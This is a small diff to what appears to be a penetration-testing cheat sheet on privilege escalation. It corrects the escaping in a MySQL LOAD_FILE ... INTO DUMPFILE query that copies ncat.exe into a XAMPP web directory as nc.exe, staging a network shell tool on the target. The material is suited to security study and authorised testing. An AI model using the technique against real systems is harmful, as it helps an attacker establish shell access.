@@ -51,7 +51,7 @@ Privilege Escalation
 
 #### 1. Copy an already existing file from Windows to another location
 
-    SELECT LOAD_FILE('C:\\xampp\htdocs\\ncat.exe') INTO DUMPFILE 'C:\\xampp\\htdocs\\nc.exe';
+    SELECT LOAD_FILE('C:\\xampp\\htdocs\\ncat.exe') INTO DUMPFILE 'C:\\xampp\\htdocs\\nc.exe';
 
 #### 2. Check permissions of the new written file
 
